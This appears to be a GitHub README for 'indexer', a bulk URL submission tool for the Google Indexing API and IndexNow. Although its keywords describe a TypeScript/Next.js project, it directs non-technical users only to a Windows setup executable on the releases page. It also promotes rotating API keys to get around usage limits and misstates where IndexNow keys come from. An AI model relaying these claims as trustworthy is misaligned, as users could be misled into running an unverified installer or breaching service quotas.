# 🚦 indexer - Fast Bulk URL Submission Tool

[![Download indexer](https://img.shields.io/badge/Download-indexer-brightgreen)](https://github.com/Kelvin-genya/indexer/releases)

---

## 📋 About indexer

indexer helps you submit many URLs at once to improve how search engines recognize your website. It supports Google Indexing API and IndexNow. The tool manages API keys automatically, tracks your usage, and tries again if something goes wrong. It also includes a web dashboard built with Next.js to monitor your submissions easily. This app works well if you have many pages and want to keep them updated on search engines quickly.

---

## 💻 System Requirements

Before you download and install indexer, make sure your Windows PC meets these needs:

- Windows 10 or newer, 64-bit
- At least 4 GB of free RAM
- 100 MB of free disk space
- Internet connection for API requests
- Any modern web browser for the dashboard (Chrome, Edge, Firefox)

No extra software or coding skills are required.

---

## 🎯 Key Features

- Submit hundreds or thousands of URLs in bulk  
- Support for Google Indexing API and IndexNow protocols  
- Automatic API key rotation to avoid limits  
- Built-in quota tracking for usage monitoring  
- Retry failed submissions automatically  
- Simple Next.js dashboard to view status and reports  
- Lightweight and easy to use on Windows

---

## 🚀 Getting Started

Follow these steps to get indexer running on your Windows PC. No programming needed.

---

### 1. Download the app

Visit this page to download the latest version:

[![Get indexer](https://img.shields.io/badge/Download-indexer-blue?style=for-the-badge)](https://github.com/Kelvin-genya/indexer/releases)

This link takes you to the official release page. Find the newest file named like `indexer-setup.exe` or similar to start your download.

---

### 2. Install the app

- After download finishes, open the setup file by double-clicking it.
- The installer will start. Click **Next** to proceed through the steps.
- Choose the install location or keep the default folder.
- Click **Install** and wait for the process to complete.
- Click **Finish** to close the installer.

---

### 3. Run indexer

- Look for the indexer icon on your desktop or Start menu.
- Double-click to open it.
- The app window will load a dashboard where you can start adding URLs.

---

### 4. Set up your API keys

indexer requires keys from Google and/or IndexNow to submit URLs:

- For Google Indexing API:
  - Visit the Google Cloud Console (console.cloud.google.com).
  - Create a new project and enable the Indexing API.
  - Generate a service account key in JSON format.
  - Upload the JSON key file in indexer under **API Keys**.

- For IndexNow:
  - Get your secret key from your domain provider or generate one using online tools.
  - Enter the key in the IndexNow section of the app.

The app will rotate between keys if you add multiple, to avoid hitting limits.

---

### 5. Add URLs for submission

- In the dashboard, find the **Add URLs** section.
- You can type URLs manually, paste a list, or upload a simple text file (.txt) containing URLs.
- After adding, review the list for completeness and accuracy.

---

### 6. Start the submission

- Click the **Submit URLs** button.
- The app will send your URLs to the selected APIs.
- You can watch progress live in the dashboard.
- Any errors or retry attempts will show up clearly.

---

## 🔧 Using the Dashboard

The Next.js dashboard has clear sections:

- **Submission Status:** See how many URLs succeeded, failed, or are pending.
- **Quota Tracking:** View your daily limits and how much you have used.
- **API Keys:** Add, remove, or edit your keys here.
- **Logs:** Review detailed reports on each submission batch.
- **Settings:** Customize retry attempts, delays, and other options.

No coding or command line use is needed. Everything works through buttons and forms.

---

## ⚙️ Troubleshooting Tips

If you encounter problems, try these steps:

- Make sure your internet connection is stable.
- Confirm your API keys are correct and active.
- Restart the app and try submitting again.
- Check the logs for error messages to understand the issue.
- If the dashboard does not load, clear your browser cache or use a different browser.

---

## 🌐 Privacy and Security

indexer only processes your URLs and keys locally on your system. It does not send your keys or data elsewhere. The app uses secure communication with Google and IndexNow APIs.

Keep your API keys private and avoid sharing them.

---

## 🔄 Updates and Support

Check the release page regularly for updates and bug fixes:

[https://github.com/Kelvin-genya/indexer/releases](https://github.com/Kelvin-genya/indexer/releases)

If you need help, use the “Issues” tab on GitHub to report problems or ask questions.

---

## 🛠 Advanced Settings

For users who want more control:

- Configure the number of retry attempts.
- Set timeouts between submissions to avoid hitting rate limits.
- Adjust logging details for better debugging.
- Enable or disable specific submission protocols.

These are accessible under **Settings** in the dashboard.

---

## 🔍 Keywords

api-key-rotation, bulk-indexing, event-driven, google-indexing-api, indexnow, motia, nextjs, seo, typescript, url-indexer